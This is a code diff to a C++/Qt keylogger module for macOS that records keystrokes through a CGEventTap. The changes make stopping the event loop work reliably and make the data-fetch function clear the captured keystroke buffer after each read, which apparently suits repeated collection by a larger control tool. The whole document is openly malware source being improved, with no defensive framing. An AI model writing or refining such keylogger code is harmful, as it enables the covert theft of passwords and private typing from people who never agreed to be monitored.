@@ -42,6 +42,7 @@ KeyloggerModule::KeyloggerModule(QObject *parent)
     instance = this;
     eventTap = nullptr;
     runLoopSource = nullptr;
+    tapRunLoop = nullptr;
     tapThread = nullptr;
 #endif
 
@@ -402,9 +403,13 @@ void KeyloggerModule::runMacEventLoop()
                        kCFRunLoopCommonModes);
     CGEventTapEnable(tap, true);
 
+    tapRunLoop = (void*)CFRunLoopGetCurrent();
+
     qDebug() << "macOS CGEventTap started.";
 
     CFRunLoopRun();
+
+    tapRunLoop = nullptr;
 
     qDebug() << "macOS event loop stopped.";
 }
@@ -496,9 +501,13 @@ QString KeyloggerModule::stopKeylogger()
         CGEventTapEnable((CFMachPortRef)eventTap, false);
     }
 
+    if (tapRunLoop)
+    {
+        CFRunLoopStop((CFRunLoopRef)tapRunLoop);
+    }
+
     if (tapThread && tapThread->isRunning())
     {
-        CFRunLoopStop(CFRunLoopGetMain());
         tapThread->quit();
         tapThread->wait(3000);
 
@@ -539,7 +548,9 @@ QString KeyloggerModule::getKeyloggerData()
         return "(No keys recorded)";
     }
 
-    return keyBuffer.join("");
+    QString data = keyBuffer.join("");
+    keyBuffer.clear(); // Clear after fetching to prevent duplicates
+    return data;
 }
 
 
